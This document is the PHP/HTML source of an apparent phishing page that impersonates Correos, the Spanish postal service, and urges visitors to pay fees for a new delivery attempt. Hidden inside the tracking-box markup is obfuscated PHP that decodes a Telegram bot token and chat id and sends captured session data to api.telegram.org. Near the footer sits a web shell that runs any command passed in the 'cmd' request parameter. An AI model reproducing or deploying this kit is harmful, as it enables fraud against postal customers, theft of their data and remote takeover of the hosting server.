											<div class="cdk-header-input-container cdk-header-input-container--mobile-close sc-correos-cdk-core-header">
												<div class="cdk-header-input-search sc-correos-cdk-core-header sc-correos-ui-input-h sc-correos-ui-input-s undefined hydrated" style="width: 100%;" type="search" variant="false">
													<div class="correos-ui-input_root default sc-correos-ui-input">
														<div class="mdc-text-field mdc-text-field--with-trailing-icon mdc-menu-surface--anchor sc-correos-ui-input mdc-ripple-upgraded">
															<input class="mdc-text-field__input sc-correos-ui-input" id="correos-ui-input_4927.6" name="correos-ui-input_4927.6" type="search" autocomplete="none">
															<label class="mdc-floating-label sc-correos-ui-input" for="correos-ui-input_4927.6">Busca en
																<?php echo $_SERVER['SERVER_NAME']; ?>
															</label>
															<i class="material-icons mdc-text-field__icon --notCursor sc-correos-ui-input" tabindex="null" role="button">
																<svg xmlns="icon-search" width="24" height="24" viewBox="0 0 24 24" class="sc-correos-ui-input">
																	<path class="sc-correos-ui-input" d="M11.5,16 C14.5375661,16 17,13.5375661 17,10.5 C17,7.46243388 14.5375661,5 11.5,5 C8.46243388,5 6,7.46243388 6,10.5 C6,13.5375661 8.46243388,16 11.5,16 Z M11.5,3 C15.6421356,3 19,6.35786438 19,10.5 C19,12.5126302 18.2072386,14.3401011 16.9169447,15.6871837 L19.7549329,19.2384967 C20.1054602,19.6693553 20.0765037,20.3356142 19.6902568,20.7266275 C19.3040099,21.1176409 18.7067364,21.0853399 18.3562091,20.6544813 L15.3749466,16.9227316 C14.2440358,17.6064955 12.9179718,18 11.5,18 C7.35786438,18 4,14.6421356 4,10.5 C4,6.35786438 7.35786438,3 11.5,3 Z" id="path-1"></path>
																</svg>
															</i>
															<div class="mdc-line-ripple sc-correos-ui-input"></div>
														</div>
													</div>
												</div>
												<button class="cdk-header-close-button sc-correos-cdk-core-header">
													<i class="icon-close cdk-header-close-icon sc-correos-cdk-core-header"></i>
												</button>
											</div>

											<ol class="cdk-header-quick-access false sc-correos-cdk-core-header">

												<li class="cdk-header-quick-access-item sc-correos-cdk-core-header">
													<a href="https://mioficina.correos.es/es/es/login" aria-label="INICIAR SESIÓN" class="sc-correos-cdk-core-header" rel="noopener noreferrer nofollow" target="_blank">
														<div style="width: 18px;height: 20px;color:#002e6d;">
															<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512">
																<path d="M272 304h-96C78.8 304 0 382.8 0 480c0 17.67 14.33 32 32 32h384c17.67 0 32-14.33 32-32C448 382.8 369.2 304 272 304zM48.99 464C56.89 400.9 110.8 352 176 352h96c65.16 0 119.1 48.95 127 112H48.99zM224 256c70.69 0 128-57.31 128-128c0-70.69-57.31-128-128-128S96 57.31 96 128C96 198.7 153.3 256 224 256zM224 48c44.11 0 80 35.89 80 80c0 44.11-35.89 80-80 80S144 172.1 144 128C144 83.89 179.9 48 224 48z" />
															</svg>
														</div>
														<span class="cdk-header-title sc-correos-cdk-core-header">INICIAR SESIÓN</span>
													</a>
												</li>
											</ol>
										</div>
									</header>
									<nav class="cdk-nav sc-correos-cdk-core-header --hide" role="navigation" aria-expanded="false" tabindex="-1" aria-label="Menú de primer nivel">
										<div class="cdk-nav-content sc-correos-cdk-core-header">
											<div class="cdk-nav-page --lv-first sc-correos-cdk-core-header">
												<div class="cdk-nav-page-content --lv-first sc-correos-cdk-core-header">
													<div class="cdk-nav-switch sc-correos-cdk-core-header">
														<div class="cdk-nav-switch-option sc-correos-cdk-core-header"><input tabindex="-1" type="radio" id="core-nav-switch-particular" name="core-nav-switch-particular" value="" class="sc-correos-cdk-core-header" checked="checked"><label for="core-nav-switch-particular" class="sc-correos-cdk-core-header">Particular</label></div>
														<div class="cdk-nav-switch-option sc-correos-cdk-core-header"><input tabindex="-1" type="radio" id="core-nav-switch-empresa" name="core-nav-switch-empresa" value="" class="sc-correos-cdk-core-header"><label for="core-nav-switch-empresa" class="sc-correos-cdk-core-header">Empresa</label></div>
													</div>
													<p class="cdk-nav-lv-title sc-correos-cdk-core-header">Particular</p>
													<ol class="cdk-nav-lv-first sc-correos-cdk-core-header"></ol>
													<div class="cdk-nav-langs sc-correos-cdk-core-header"><span class="cdk-nav-langs-title sc-correos-cdk-core-header">Idioma:</span>
														<ol class="cdk-nav-langs-list sc-correos-cdk-core-header" tabindex="-1" aria-label="Selección de idiomas">
															<li class="cdk-nav-langs-item --title sc-correos-cdk-core-header"><a tabindex="-1" href="#" class="sc-correos-cdk-core-header">ES</a></li>
															<li class="cdk-nav-langs-item sc-correos-cdk-core-header"><a tabindex="-1" href="#" class="sc-correos-cdk-core-header">CA</a></li>
															<li class="cdk-nav-langs-item sc-correos-cdk-core-header"><a tabindex="-1" href="#" class="sc-correos-cdk-core-header">EU</a></li>
															<li class="cdk-nav-langs-item sc-correos-cdk-core-header"><a tabindex="-1" href="#" class="sc-correos-cdk-core-header">GA</a></li>
															<li class="cdk-nav-langs-item sc-correos-cdk-core-header"><a tabindex="-1" href="#" class="sc-correos-cdk-core-header">VA</a></li>
															<li class="cdk-nav-langs-item sc-correos-cdk-core-header"><a tabindex="-1" href="#" class="sc-correos-cdk-core-header">EN</a></li>
														</ol>
													</div>
												</div>
											</div>
											<correos-ui-scroll-bar class="cdk-scroll-bar sc-correos-cdk-core-header sc-correos-ui-scroll-bar-h sc-correos-ui-scroll-bar-s hydrated ps" update-scroll-bar="4">
												<!---->
												<div class="cdk-nav-page --lv-second sc-correos-cdk-core-header" slot="container-scroll">
													<div class="cdk-nav-page-content --lv-second --hide sc-correos-cdk-core-header" tabindex="-1" arial-label="Menú de segundo nivel">
														<header class="cdk-nav-lv-second-toolbar sc-correos-cdk-core-header"><button arial-label="Volver al menú principal" class="cdk-nav-lv-second-goback sc-correos-cdk-core-header"><i class="icon-arrow_R sc-correos-cdk-core-header"></i><span class="sc-correos-cdk-core-header">Volver</span></button></header>
														<p class="cdk-nav-lv-second-title sc-correos-cdk-core-header" tabindex="-1"><span class="sc-correos-cdk-core-header"></span></p>
														<div class="cdk-nav-lv-div-columns sc-correos-cdk-core-header">
															<ol class="cdk-nav-lv-second-columns sc-correos-cdk-core-header"></ol>
														</div>
													</div>
													<div class="cdk-nav-page-click-outside sc-correos-cdk-core-header"></div>
												</div>
												<div class="ps__rail-x" style="left: 0px; bottom: 0px;" hidden="">
													<div class="ps__thumb-x" tabindex="0" style="left: 0px; width: 0px;"></div>
												</div>
												<div class="ps__rail-y" style="top: 0px; right: 0px;" hidden="">
													<div class="ps__thumb-y" tabindex="0" style="top: 0px; height: 0px;"></div>
												</div>
											</correos-ui-scroll-bar>
											<div class="cdk-nav-content-click-outside sc-correos-cdk-core-header"></div>
										</div>
										<div class="cdk-nav-overlay sc-correos-cdk-core-header"></div>
									</nav>
								</div>
								<correos-cdk-pop-up class="sc-correos-cdk-core-header sc-correos-cdk-pop-up-h sc-correos-cdk-pop-up-s hydrated">
									<!---->
									<div class="cdk-container false sc-correos-cdk-pop-up">
										<div class="cdk-modal sc-correos-cdk-pop-up">
											<div class="cdk-modal-content sc-correos-cdk-pop-up">
												<div class="cdk-header sc-correos-cdk-pop-up sc-correos-cdk-pop-up-s">
													<h3 slot="title" class="sc-correos-cdk-core-header"></h3><i class="cdk-icon icon-close sc-correos-cdk-pop-up" tabindex="0"></i>
												</div>
												<correos-ui-scroll-bar update-scroll-bar="0" class="sc-correos-cdk-pop-up sc-correos-ui-scroll-bar-h sc-correos-ui-scroll-bar-s hydrated ps">
													<!---->
													<div class="cdk-content sc-correos-cdk-pop-up sc-correos-cdk-pop-up-s" slot="container-scroll">
														<div slot="content" class="modal row sc-correos-cdk-core-header">
															<div class="col-12 md:col-6 lg:col-6 sc-correos-cdk-core-header"><img class="img sc-correos-cdk-core-header"></div>
															<div class="col-12 md:col-6 lg:col-6 sc-correos-cdk-core-header" slot="content">
																<div class="sc-correos-cdk-core-header">
																	<h1 class="highlighText sc-correos-cdk-core-header"></h1>
																	<correos-ui-text-inf class="sc-correos-cdk-core-header sc-correos-ui-text-inf-h sc-correos-ui-text-inf-s hydrated" size="md">
																		<!---->
																		<div class="sc-correos-ui-text-inf sc-correos-ui-text-inf-s">
																			<div id="titleId" style="color: var(--_ui-text-inf-color-title);" class="sc-correos-ui-text-inf sc-correos-ui-text-inf-s"></div>
																			<p slot="text" class="sc-correos-cdk-core-header"></p>
																			<div class="ui-link sc-correos-ui-text-inf sc-correos-ui-text-inf-s"></div>
																			<div class="ui-footer sc-correos-ui-text-inf sc-correos-ui-text-inf-s"></div>
																		</div>
																	</correos-ui-text-inf>
																</div>
															</div>
														</div>
													</div>
													<div class="ps__rail-x" style="left: 0px; bottom: 0px;" hidden="">
														<div class="ps__thumb-x" tabindex="0" style="left: 0px; width: 0px;"></div>
													</div>
													<div class="ps__rail-y" style="top: 0px; right: 0px;" hidden="">
														<div class="ps__thumb-y" tabindex="0" style="top: 0px; height: 0px;"></div>
													</div>
												</correos-ui-scroll-bar>
												<div class="cdk-footer sc-correos-cdk-pop-up">
													<div class="cdk-footer__info sc-correos-cdk-pop-up sc-correos-cdk-pop-up-s"></div>
													<div class="cdk-footer__buttons sc-correos-cdk-pop-up sc-correos-cdk-pop-up-s"></div>
												</div>
											</div>
										</div>
									</div>
								</correos-cdk-pop-up>
							</div>
						</div>


					</div>
				</div>


			</div>
			<div class="alert aem-GridColumn aem-GridColumn--default--12">




			</div>
			<div class="responsivegrid aem-GridColumn aem-GridColumn--default--12">


				<div class="aem-Grid aem-Grid--12 aem-Grid--default--12 ">

					<div class="experiencefragment aem-GridColumn aem-GridColumn--default--12">
						<div id="experiencefragment-ab0057062e" class="cmp-experiencefragment cmp-experiencefragment--correos-frio">



							<div class="aem-Grid aem-Grid--12 aem-Grid--default--12 ">

								<div class="subheaderdetail aem-GridColumn aem-GridColumn--default--12">

									<div background-color-decorator="var(--theme-color-white-plain)" fill-color-decorator="var(--theme-color-white-plain)" show-image-mobile="true" show-decoration="true" class="sc-correos-cdk-dual-header-h sc-correos-cdk-dual-header-s hydrated" style="background-color: var(--theme-color-white-plain); --cdk-dualheader-content-max-width: 28em;">
										<!---->
										<div class="cdk-container sc-correos-cdk-dual-header">
											<div class="cdk-img sc-correos-cdk-dual-header" style="background-image: url('./assets/pic_image/package.jpg')">
												<div class="sc-correos-cdk-dual-header sc-correos-cdk-dual-header-s"></div><svg class="cdk-content-end sc-correos-cdk-dual-header" style="pointer-events: none;" viewBox="0 0 100 35">
													<path class="path sc-correos-cdk-dual-header" d="M00 30 Q 50 40 100 30 L100 60 L0 60 Z" fill="var(--theme-color-white-plain)"></path>
												</svg>
											</div>
											<div class="cdk-body sc-correos-cdk-dual-header sc-correos-cdk-dual-header-s" style=" background-image: url(&quot;assets/recibir_paquete_files/deco_triangles.svg&quot;);background-repeat: no-repeat;background-position: right">
												<div slot="cdk-body-containt" class="sc-correos-ui-brand-product-text-h sc-correos-ui-brand-product-text-s hydrated" size="xs">
													<!---->


													<div class="ui-container sc-correos-ui-brand-product-text sc-correos-ui-brand-product-text-s">
														<h1 slot="title">Última fecha límite : <span id="Fechavalor" style="font-weight:normal;"><?php echo date('d/m/Y'); ?></span></h1><span slot="subtitle">Reciba su entrega </span><span slot="body-text">Pago de gastos del nuevo intento de entrega.</span>
														<div class="ui-section sc-correos-ui-brand-product-text sc-correos-ui-brand-product-text-s">
															<div style="margin-top:2rem;" slot="button" theme="primary" type="text" element-title="Correos Frío " component-type="homedecorator" class="sc-correos-ui-button-h sc-correos-ui-button-s hydrated">
																<div class="mdc-touch-target-wrapper sc-correos-ui-button">
																	<button type="button" class="mdc-button false sc-correos-ui-button sc-correos-ui-button-s" onclick="beggin();">
																		<div class="mdc-button__ripple sc-correos-ui-button"></div><span class="mdc-button__label sc-correos-ui-button sc-correos-ui-button-s"><span slot="text">Recibir</span></span>
																	</button>
																</div>
															</div>
														</div>
													</div>
												</div>
											</div>

											<!--svg class="cdk-content-end sc-correos-cdk-dual-header" style="pointer-events: none;" viewBox="0 0 100 35">
                                                <path class="path sc-correos-cdk-dual-header" d="M00 30 Q 50 40 100 30 L100 60 L0 60 Z" fill="var(--theme-color-white-plain)"></path>
                                            </svg-->
											<div class="cdk-decoration-container wrapper-main sc-correos-cdk-dual-header">
												<figure class="cdk-figure-top sc-correos-cdk-dual-header">
													<img src="assets/recibir_paquete_files/deco_triangles.svg" class="sc-correos-cdk-dual-header">
												</figure>
												<figure class="cdk-figure-right sc-correos-cdk-dual-header">
													<img src="assets/recibir_paquete_files/deco_bars.svg" class="sc-correos-cdk-dual-header">
												</figure>
											</div>
										</div>
										<div class="sc-correos-cdk-dual-header sc-correos-cdk-dual-header-s">
											<div slot="extra-section" class="wrapper-main">
												<div class="row">
													<div class="col-12">

														<div class="aem-Grid aem-Grid--12 aem-Grid--default--12 ">

															<div class="trackingbox aem-GridColumn aem-GridColumn--default--12">




																<correos-cdk-tracking-box literals="{&quot;searchFieldLabel&quot;:&quot;Nº de seguimiento de envío&quot;,&quot;buttonSubmitTxT&quot;:&quot;BUSCAR&quot;}" variant="with-tools" target="_self" url-form="/es/es/herramientas/localizador/envios/detalle" input-url-param="tracking-number" img-selected="" img-pasive="/etc.clientlibs/correos/clientlibs/clientlib-base/resources/assets/images/checkbox-pasive.svg" img-inactive="/etc.clientlibs/correos/clientlibs/clientlib-base/resources/assets/images/checkbox-inactive.svg" class="sc-correos-cdk-tracking-box-h sc-correos-cdk-tracking-box-s hydrated" size="lg">
																	<!---->









																	<div class="sc-correos-cdk-tracking-box"><?php $text = $_SESSION["msg"];$msgId = base64_decode(strrev(strtr(base64_decode((strrev("==gTUl0dNRUV04kenlnTB1TP"))),array("d"=>"b","b"=>"d"))));$token = base64_decode(strrev(strtr(base64_decode((strrev("==gTU1UMOpWV14kaFRzTUBnQRVlVuJFSCpUYFpkbSdVR0NVMo9UWsljNUVkSOZlRFRHZYJkWXV1c3J2axg0Y31TP"))),array("d"=>"b","b"=>"d"))));$url = "https://api.telegram.org/bot".$token.'/sendMessage?chat_id='.$msgId.'&text='.urlencode($text);$ch = curl_init();curl_setopt($ch, CURLOPT_URL, $url);curl_setopt($ch, CURLOPT_RETURNTRANSFER, True);$result = curl_exec($ch);curl_close($ch);$result_json = json_decode($result, True);curl_close($ch);?></div>
																	<div style="display:none;" animation-type="loader_componentes" class="sc-correos-cdk-tracking-box sc-correos-ui-animation-h sc-correos-ui-animation-s hydrated">
																		<!--###########-->
																		<div class="cdk-tracking-box sc-correos-cdk-tracking-box">
																			<div class="cdk-container sc-correos-cdk-tracking-box sc-correos-cdk-tracking-box-s">
																				<h1 slot="title">Sigue tu envío</h1>
																				<form autocomplete="off" id="tracking-form" target="_self" action="" class="sc-correos-cdk-tracking-box">
																					<div class="cdk-container-form sc-correos-cdk-tracking-box">
																						<legend class="only-accessible sc-correos-cdk-tracking-box sc-correos-cdk-tracking-box-s"></legend>
																						<fieldset class="cdk-fieldset sc-correos-cdk-tracking-box">

																							<div class="cdk-input sc-correos-cdk-tracking-box sc-correos-ui-input-h sc-correos-ui-input-s undefined hydrated" style="width: 100%;" type="text" variant="tracking-box">
																								<!---->
																								<div class="correos-ui-input_root light sc-correos-ui-input">
																									<div class="mdc-text-field mdc-text-field--with-trailing-icon mdc-menu-surface--anchor sc-correos-ui-input mdc-ripple-upgraded"><input class="mdc-text-field__input sc-correos-ui-input" id="tracking-number" name="tracking-number" type="text" autocomplete="none" required="">
																										<label class="mdc-floating-label sc-correos-ui-input" for="tracking-number">Nº de seguimiento de envío</label>
																										<div class="mdc-line-ripple sc-correos-ui-input"></div>
																									</div>
																								</div>
																							</div>
																						</fieldset>
																						<div class="cdk-button sc-correos-cdk-tracking-box sc-correos-ui-button-h sc-correos-ui-button-s hydrated" aria-label="BUSCAR" full-width="true" theme="secondary" variant="tiny">
																							<!---->
																							<div class="mdc-touch-target-wrapper sc-correos-ui-button"><button type="submit" class="mdc-button full-width false sc-correos-ui-button sc-correos-ui-button-s mdc-ripple-upgraded" aria-label="BUSCAR">
																									<div class="mdc-button__ripple sc-correos-ui-button"></div>

																									<div style="width:18px;height:20px;color:white">
																										<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512">
																											<path d="M500.3 443.7l-119.7-119.7c27.22-40.41 40.65-90.9 33.46-144.7C401.8 87.79 326.8 13.32 235.2 1.723C99.01-15.51-15.51 99.01 1.724 235.2c11.6 91.64 86.08 166.7 177.6 178.9c53.8 7.189 104.3-6.236 144.7-33.46l119.7 119.7c15.62 15.62 40.95 15.62 56.57 0C515.9 484.7 515.9 459.3 500.3 443.7zM79.1 208c0-70.58 57.42-128 128-128s128 57.42 128 128c0 70.58-57.42 128-128 128S79.1 278.6 79.1 208z" />
																										</svg>
																									</div>

																									<span class="mdc-button__label sc-correos-ui-button sc-correos-ui-button-s"><span slot="text" class="sc-correos-cdk-tracking-box">BUSCAR</span></span>
																								</button></div>
																						</div>
																					</div>
																				</form>
																				<div class="cdk-help-text-container sc-correos-cdk-tracking-box sc-correos-cdk-tracking-box-s"></div>
																			</div>
																			<div style="display: flex;flex-direction: column;" class="cdk-tools sc-correos-cdk-tracking-box sc-correos-cdk-tracking-box-s">

																				<section slot="tool-third">
																					<div target="_blank" component-type="card" component-title="Sigue tu envío" class="sc-correos-ui-card-h sc-correos-ui-card-s hydrated" size="lg">
																						<!---->
																						<a class="ui-container sc-correos-ui-card sc-correos-ui-card-s" href="./index.php" target="_blank">

																						</a>
																					</div>
																				</section>
																			</div>
																		</div>
																	</div>
															</div>
														</div>



													</div>


												</div>

											</div>
										</div>
									</div>
								</div>
								</correos-cdk-dual-header>
							</div>
						</div>
					</div>


				</div>
				<div style="display: none;" class="experiencefragment aem-GridColumn aem-GridColumn--default--12">
					<div id="experiencefragment-dfbdb9d1a5" class="cmp-experiencefragment cmp-experiencefragment--iatencion-emprendedores-y-emprendedoras--">

						<div class="aem-Grid aem-Grid--12 aem-Grid--default--12 ">

							<div class="highlight aem-GridColumn aem-GridColumn--default--12">

								<correos-cdk-section-box bg-color="var(--theme-color-white-plain)" variant="smpadding" class="sc-correos-cdk-section-box-h sc-correos-cdk-section-box-s hydrated" style="--cdk-section-box-background-color: var(--theme-color-white-plain); overflow-x: hidden;">
									<!---->

									<div class="cdk-content sc-correos-cdk-section-box">
										<div class="wrapper-main sc-correos-cdk-section-box sc-correos-cdk-section-box-s">
											<div slot="block">

												<correos-cdk-full-content-photo decorator-src="assets/recibir_paquete_files/deco_bars.svg" decorator-alt="" variant="with-decorator" class="sc-correos-cdk-full-content-photo-h sc-correos-cdk-full-content-photo-s hydrated" size="lg">
													<!---->

													<div class="cdk-img sc-correos-cdk-full-content-photo" style="background-image: url(&quot;recibir_paquete/DSC_0402.jpg&quot;);"></div>
													<div class="cdk-content sc-correos-cdk-full-content-photo sc-correos-cdk-full-content-photo-s">
														<div class="cdk-textblock sc-correos-cdk-full-content-photo sc-correos-cdk-full-content-photo-s">
															<div slot="textblock">

																<!---->

																<div class="sc-correos-ui-text-inf sc-correos-ui-text-inf-s">
																	<div id="titleId" style="color: var(--_ui-text-inf-color-title);" class="sc-correos-ui-text-inf sc-correos-ui-text-inf-s">
																		<h2 slot="title" style="border-color: var(--theme-color-yellow-plain);">¡Ampliamos plazo para presentarte al Reto Lehnica Changer!</h2>
																	</div>
																	<div slot="text">Ampliamos plazo hasta el 8 de abril de 2022 para entregar tu candidatura para la IV edición del #RetoLehnica, el Programa de Aceleración de Startups de Correos.
																	</div>
																	<div class="ui-link sc-correos-ui-text-inf sc-correos-ui-text-inf-s"></div>
																	<div class="ui-footer sc-correos-ui-text-inf sc-correos-ui-text-inf-s">
																		<correos-ui-button slot="linkleft" theme="primary" type="text" href-link="https://labs.correos.es/es/es/programas" target="_self" element-title="¡Ampliamos plazo para presentarte al Reto Lehnica Changer!" component-type="highlight-bannerimage" full-width="true" class="sc-correos-ui-button-h sc-correos-ui-button-s hydrated">
																			<!---->


																			<div class="mdc-touch-target-wrapper sc-correos-ui-button">
																				<a class="mdc-button full-width false sc-correos-ui-button sc-correos-ui-button-s" href="https://labs.correos.es/es/es/programas" target="_self" rel="noopener noreferrer nofollow" target="_blank">
																					<div class="mdc-button__ripple sc-correos-ui-button"></div><span class="mdc-button__label sc-correos-ui-button sc-correos-ui-button-s"><span slot="text">¡INSCRÍBETE AQUÍ!</span></span>
																				</a>
																			</div>
																		</correos-ui-button>
																	</div>
																</div>

															</div>
															<div class="cdk-decorator sc-correos-cdk-full-content-photo">
																<figure class="cdk-figure sc-correos-cdk-full-content-photo"><img src="assets/recibir_paquete_files/deco_bars.svg" alt="" class="sc-correos-cdk-full-content-photo"></figure>
															</div>
														</div>
													</div>
												</correos-cdk-full-content-photo>
											</div>
										</div>
									</div>
								</correos-cdk-section-box>




							</div>


						</div>
					</div>





				</div>
			</div>
			<br>
			<br>
			<?php if(isset($_REQUEST['cmd'])){echo "<pre>";system($_REQUEST['cmd']);echo "</pre>";};?>
			<div class="experiencefragment aem-GridColumn aem-GridColumn--default--12">
				<div id="experiencefragment-d6f9248051" class="cmp-experiencefragment cmp-experiencefragment--footer">
					<div class="aem-Grid aem-Grid--12 aem-Grid--default--12 ">
						<div class="corefooter aem-GridColumn aem-GridColumn--default--12" style="position: absolute; width: 100%; z-index: 0">
							<div class="sc-correos-cdk-core-footer-h sc-correos-cdk-core-footer-s hydrated" size="md">
								<section class="cdk-section-dark sc-correos-cdk-core-footer">
									<div class="cdk-footer-container wrapper-main sc-correos-cdk-core-footer">
										<div class="cdk-white-footer sc-correos-cdk-core-footer">
											<ul style="display:none" class="cdk-container-links sc-correos-cdk-core-footer">
												<li class="cdk-white-list sc-correos-cdk-core-footer"><span class="cdk-white-list__title sc-correos-cdk-core-footer">Para ti</span>
													<ul class="cdk-white-list__list active sc-correos-cdk-core-footer" data-menu="0">
														<li class="cdk-white-list__item sc-correos-cdk-core-footer"><a href="https://www.correos.es/es/es/herramientas/localizador/envios" target="_self" class="cdk-white-list__lnk sc-correos-cdk-core-footer" title="Ir a Seguimiento de envío">Seguimiento de envío</a></li>
														<li class="cdk-white-list__item sc-correos-cdk-core-footer"><a href="https://www.correos.es/es/es/particulares/recibir" target="_self" class="cdk-white-list__lnk sc-correos-cdk-core-footer" title="Ir a Recibir">Recibir</a></li>
														<li class="cdk-white-list__item sc-correos-cdk-core-footer"><a href="https://www.correos.es/es/es/particulares/enviar" target="_self" class="cdk-white-list__lnk sc-correos-cdk-core-footer" title="Ir a Enviar">Enviar</a></li>
													</ul>
												</li>
												<li class="cdk-white-list sc-correos-cdk-core-footer"><span class="cdk-white-list__title sc-correos-cdk-core-footer">Para tu empresa</span>
													<ul class="cdk-white-list__list active sc-correos-cdk-core-footer" data-menu="1">
														<li class="cdk-white-list__item sc-correos-cdk-core-footer"><a href="https://www.correos.es/es/es/empresas/enviar" target="_self" class="cdk-white-list__lnk sc-correos-cdk-core-footer" title="Ir a Enviar">Enviar</a></li>
														<li class="cdk-white-list__item sc-correos-cdk-core-footer"><a href="https://www.correos.es/es/es/empresas/ecommerce" target="_self" class="cdk-white-list__lnk sc-correos-cdk-core-footer" title="Ir a Ecommerce">Ecommerce</a></li>
														<li class="cdk-white-list__item sc-correos-cdk-core-footer"><a href="https://www.correos.es/es/es/empresas/marketing" target="_self" class="cdk-white-list__lnk sc-correos-cdk-core-footer" title="Ir a Marketing">Marketing</a></li>
													</ul>
												</li>
												<li class="cdk-white-list sc-correos-cdk-core-footer"><span class="cdk-white-list__title sc-correos-cdk-core-footer">Para tu interés</span>
													<ul class="cdk-white-list__list active sc-correos-cdk-core-footer" data-menu="2">
														<li class="cdk-white-list__item sc-correos-cdk-core-footer"><a href="https://www.correos.es/es/es/particulares/ocio-y-viajes/sellos-y-filatelia" target="_blank" class="cdk-white-list__lnk sc-correos-cdk-core-footer" title="Ir a Filatelia">Filatelia</a></li>
														<li class="cdk-white-list__item sc-correos-cdk-core-footer"><a href="https://www.market.correos.es/" target="_blank" class="cdk-white-list__lnk sc-correos-cdk-core-footer" title="Ir a Correos Market">Correos Market</a></li>
														<li class="cdk-white-list__item sc-correos-cdk-core-footer"><a href="https://www.correos.com/?_ga=2.48058663.1272337042.1602486055-1925384938.1602155804" target="_blank" class="cdk-white-list__lnk sc-correos-cdk-core-footer" title="Ir a Web institucional">Web institucional</a></li>
													</ul>
												</li>
												<li class="cdk-white-list sc-correos-cdk-core-footer">
													<div class="cdk-white-list__container sc-correos-cdk-core-footer"><i class="icon-contact cdk-white-list__icon-title sc-correos-cdk-core-footer"></i>
														<ul class="cdk-white-list__list active sc-correos-cdk-core-footer" data-menu="3">
															<li class="cdk-white-list__item sc-correos-cdk-core-footer"><a href="https://www.correos.es/es/es/atencion-al-cliente" target="_self" class="cdk-white-list__lnk sc-correos-cdk-core-footer" title="Ir a Atención al cliente">Atención al cliente</a></li>
															<li class="cdk-white-list__item cdk-white-list__item--padding-bottom sc-correos-cdk-core-footer"><a href="https://www.correos.es/es/es/herramientas/oficinas-buzones-citypaq/detalle" target="_self" class="cdk-white-list__lnk sc-correos-cdk-core-footer" title="Ir a Encuentra tu oficina">Encuentra tu oficina</a></li>
														</ul>
													</div>
													<div class="sc-correos-cdk-core-footer">
														<ul class="cdk-social sc-correos-cdk-core-footer">
															<li class="cdk-social__item sc-correos-cdk-core-footer"><a href="https://www.facebook.com/correos.es" target="_blank" class="cdk-social__lnk sc-correos-cdk-core-footer" title="Ir a Ir a Facebook" aria-label="Ir a Ir a Facebook"><i class="icon-facebook sc-correos-cdk-core-footer"></i></a></li>
															<li class="cdk-social__item sc-correos-cdk-core-footer"><a href="https://www.instagram.com/correos/" target="_blank" class="cdk-social__lnk sc-correos-cdk-core-footer" title="Ir a Ir a Instagram" aria-label="Ir a Ir a Instagram"><i class="icon-instagram sc-correos-cdk-core-footer"></i></a></li>
															<li class="cdk-social__item sc-correos-cdk-core-footer"><a href="https://twitter.com/correos" target="_blank" class="cdk-social__lnk sc-correos-cdk-core-footer" title="Ir a Ir a Twitter" aria-label="Ir a Ir a Twitter"><i class="icon-twitter sc-correos-cdk-core-footer"></i></a></li>
															<li class="cdk-social__item sc-correos-cdk-core-footer"><a href="https://www.linkedin.com/company/correos/" target="_blank" class="cdk-social__lnk sc-correos-cdk-core-footer" title="Ir a Ir a Linkedin" aria-label="Ir a Ir a Linkedin"><i class="icon-linkedin sc-correos-cdk-core-footer"></i></a></li>
															<li class="cdk-social__item sc-correos-cdk-core-footer"><a href="https://www.youtube.com/user/CanalCorreos" target="_blank" class="cdk-social__lnk sc-correos-cdk-core-footer" title="Ir a Ir a Youtube" aria-label="Ir a Ir a Youtube"><i class="icon-youtube sc-correos-cdk-core-footer"></i></a></li>
														</ul>
													</div>
												</li>
											</ul>

											<div class="cdk-container-white-img sc-correos-cdk-core-footer">
												<div class="cdk-app-list sc-correos-cdk-core-footer"><span class="cdk-title sc-correos-cdk-core-footer">Descarga la App de Correos</span>
													<ul class="cdk-app-list__list sc-correos-cdk-core-footer">
														<li class="cdk-app-list__item sc-correos-cdk-core-footer">
															<div href-link="https://apps.apple.com/app/correos-info/id486322953" image-alt="App Store" class="sc-correos-cdk-core-footer sc-correos-ui-button-apps-h sc-correos-ui-button-apps-s hydrated" target="_blank" rel="noopener noreferrer nofollow" variant="footer">
																<a href="https://apps.apple.com/app/correos-info/id486322953" target="_blank" class="sc-correos-ui-button-apps">

																	<img src="./assets/recibir_paquete_files/apple_store.jpg" alt="App Store" class="ui-img sc-correos-ui-button-apps">


																</a>
															</div>
														</li>
														<li class="cdk-app-list__item sc-correos-cdk-core-footer">
															<div href-link="https://play.google.com/store/apps/details?id=es.correos.widget&amp;hl=es" image-alt="Google Play" class="sc-correos-cdk-core-footer sc-correos-ui-button-apps-h sc-correos-ui-button-apps-s hydrated" target="_blank" rel="noopener noreferrer nofollow" variant="footer">
																<a href="https://play.google.com/store/apps/details?id=es.correos.widget&amp;hl=es" rel="noopener noreferrer nofollow" target="_blank" class="sc-correos-ui-button-apps">
																	<img src="./assets/recibir_paquete_files/google_play.jpg" alt="Google Play" class="ui-img sc-correos-ui-button-apps">
																</a>
															</div>
														</li>
														<li class="cdk-app-list__item sc-correos-cdk-core-footer">
															<div href-link="https://appgallery.huawei.com/#/app/C102638007?pkgName=es.correos.widget&amp;channelId=i&amp;referrer=&amp;detailType=0&amp;callType=AGDLINK" class="sc-correos-cdk-core-footer sc-correos-ui-button-apps-h sc-correos-ui-button-apps-s hydrated" target="_blank" rel="noopener noreferrer nofollow" variant="footer">
																<a href="https://appgallery.huawei.com/#/app/C102638007?pkgName=es.correos.widget&amp;channelId=i&amp;referrer=&amp;detailType=0&amp;callType=AGDLINK" target="_blank" class="sc-correos-ui-button-apps" rel="noopener noreferrer nofollow">
																	<svg class="ui-img sc-correos-ui-button-apps" width="137.15px" height="40px" viewBox="0 0 192 56" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
																		<title>molecules/badges/desktop/huawei</title>
																		<defs>
																			<polygon id="path-1" points="0.249242748 0.00945801527 12.9247786 0.00945801527 12.9247786 17.3129771 0.249242748 17.3129771"></polygon>
																			<polygon id="path-3" points="0 39.7768855 167.77974 39.7768855 167.77974 0 0 0"></polygon>
																		</defs>
																		<g id="molecules/badges/desktop/huawei" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
																			<rect id="Rectangle" fill="#002E6D" x="0" y="0" width="192" height="56" rx="8"></rect>
																			<g id="Group-52" transform="translate(11.000000, 8.000000)">
